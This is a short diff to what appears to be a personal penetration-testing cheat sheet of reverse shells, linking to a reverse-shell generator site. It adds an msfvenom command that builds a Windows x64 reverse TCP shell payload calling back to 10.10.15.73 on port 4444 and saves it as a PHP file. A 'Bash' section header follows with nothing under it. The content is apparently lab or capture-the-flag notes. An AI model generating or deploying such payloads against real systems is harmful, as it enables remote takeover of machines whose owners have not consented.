@@ -1,5 +1,9 @@
 Can create more shells here: https://www.revshells.com/
 
+### msfvenom
+
+> sudo msfvenom -p windows/x64/shell/shell_reverse_tcp LHOST=10.10.15.73 LPORT=4444 -f php > /home/kali/msfshelly.php
+
 ### Bash 
 
 ```
